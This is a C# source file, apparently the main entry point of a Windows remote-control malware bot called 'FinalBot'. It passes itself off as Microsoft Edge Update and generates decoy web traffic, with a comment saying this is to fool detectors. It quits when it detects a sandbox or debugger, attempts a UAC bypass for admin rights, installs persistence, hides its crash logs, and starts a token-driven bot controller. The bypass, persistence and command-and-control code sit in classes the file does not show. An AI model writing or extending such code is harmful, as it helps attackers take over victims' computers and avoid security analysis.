using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using VanguardCore;

namespace FinalBot
{
    class Program
    {
        private static Mutex? _mutex;

        private static void DebugLog(string msg)
        {
            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        static async Task Main(string[] args)
        {
            DebugLog("=== PROGRAM START ===");
            
            // 1. Single Instance Check — fixed name to prevent multi-launch conflicts
            bool createdNew;
            string mutexName = "Global\\Vanguard_System_Runtime_7X2B9"; // Unique signature to avoid legacy locks
            _mutex = new Mutex(true, mutexName, out createdNew);
            if (!createdNew) 
            {
                Console.WriteLine("[-] Instance already active. Terminate existing process first.");
                DebugLog("Process already running (Mutex found). Exiting.");
                return;
            }

            DebugLog("Mutex acquired. Initializing services...");

            // 3. Decoy Traffic — looks like normal browsing to AI detectors
            _ = Task.Run(async () =>
            {
                using var http = new HttpClient();
                http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                string[] decoyUrls = {
                    "https://www.google.com/search?q=weather+today",
                    "https://www.bing.com/search?q=latest+news",
                    "https://api.github.com/",
                    "https://www.cloudflare.com/",
                    "https://dns.google/"
                };
                var rng = new Random();
                while (true)
                {
                    try { await http.GetStringAsync(decoyUrls[rng.Next(decoyUrls.Length)]); } catch { }
                    await Task.Delay(rng.Next(45_000, 120_000));
                }
            });

            // 2. Anti-Analysis Check
            if (SafetyManager.VerifySystemContext()) 
            {
                DebugLog("Sandbox/Debugger detected. Exiting.");
                return;
            }

            // 3. Generate behavioral noise
            SafetyManager.AntiBehavior();

            // 3. UAC Check & Bypass
            if (!ElevationService.IsAdmin())
            {
                DebugLog("Not admin. Attempting UAC bypass...");
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName ?? "MicrosoftEdgeUpdate.exe";
                
                // CRITICAL: Release mutex before starting the elevated process, 
                // otherwise the elevated instance will see it as 'already running' and exit.
                _mutex?.Dispose();
                _mutex = null;

                if (ElevationService.RequestElevation(selfPath))
                {
                    DebugLog("UAC bypass request sent. Exiting non-admin process.");
                    return; 
                }
                
                // If bypass failed, re-acquire mutex
                _mutex = new Mutex(true, mutexName, out _);
            }
            else
            {
                DebugLog("Running with ADMIN privileges.");
            }

            // 4. Persistence
            Persistence.Install();

            // 5. Start Orchestrator
            try 
            {
                DebugLog("Loading ConfigManager...");
                ConfigManager.Load();
                
                string token = ConfigManager.Get("BOT_TOKEN");
                string adminId = ConfigManager.Get("ADMIN_ID");
                
                DebugLog($"Token length: {token?.Length ?? 0}, AdminID: {adminId}");

                if (string.IsNullOrEmpty(token) || token.Length < 10)
                {
                    DebugLog("Token invalid. Application cannot proceed.");
                    return;
                }

                DebugLog("Creating BotOrchestrator...");
                var orchestrator = new BotOrchestrator(token, adminId);
                
                DebugLog("Starting BotOrchestrator...");
                await orchestrator.StartAsync();
            }
            catch (Exception ex)
            {
                DebugLog($"FATAL ERROR: {ex.Message}\n{ex.StackTrace}");
                Logger.Error("Fatal application error", ex);
                LogCrash(ex);
            }
        }

        private static void LogCrash(Exception ex)
        {
            try
            {
                // Write to hidden temp path — avoid obvious Public folder
                string path = Path.Combine(Path.GetTempPath(), $".{Environment.MachineName}_sys.log");
                File.AppendAllText(path, $"[CRITICAL] {DateTime.Now}: {ex}\n");
                File.SetAttributes(path, FileAttributes.Hidden);
            } catch { }
        }
    }
}
